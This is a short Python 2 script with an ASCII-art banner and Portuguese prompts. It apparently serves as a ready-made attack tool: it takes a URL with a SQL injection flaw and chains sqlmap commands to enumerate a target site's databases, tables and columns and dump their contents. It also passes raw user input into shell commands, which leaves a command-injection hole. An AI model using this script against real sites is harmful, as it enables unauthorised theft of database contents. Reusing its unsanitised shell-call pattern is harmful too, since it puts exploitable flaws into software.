#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os,sys
print"             ,----------------,              ,---------,"
print"        ,-----------------------,          ,´        ,´|"
print"      ,                        ,|        ,´        ,   |"
print"     +-----------------------+  |      ,          ,    |"
print"     |  .-----------------.  |  |     +---------+      |"
print"     |  |                 |  |  |     | -==----'|      |"
print"     |  |  SQLLMAP TACK!  |  |  |     |         | sys  |"
print"     |  |  qual o comando?|  |  |/----|`---=    |      |"
print"     |  |  root@kp:~/#    |  |  |   ,/|==== ooo |      ;"
print"     |  |                 |  |  |  // |(((( [33]|    ,"
print"     |  `-----------------'  |, .;'| |((((      |  ,"
print"     +-----------------------+  ;;  | |         |,"
print"        /_)______________(_/  //'   | +---------+"
print"   ___________________________/___  `,"
print"  /  oooooooooooooooo  .o.  oooo /,   \,-----------"
print" / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
print"/_==__==========__==_ooo__ooo=_/'   /___________,"
print"-----------------------------'"
print""
print""
url = raw_input("digite o site e a vunerabilidade SQL: ")
os.system("sqlmap -u "+url+" --dbs")
db = raw_input("digite o banco de dados? ")
os.system("sqlmap -u "+url+" --dbs "+"-D "+db+" --tables")
tb = raw_input("digite a tabela?: ")
os.system("sqlmap -u "+url+" --dbs"+" -T "+tb+" --columns")
dump = raw_input("digite oque quer pegar?: ")
os.system("sqlmap -u"+url+" -D "+db+" -T "+tb+" -C "+dump+" --dump")
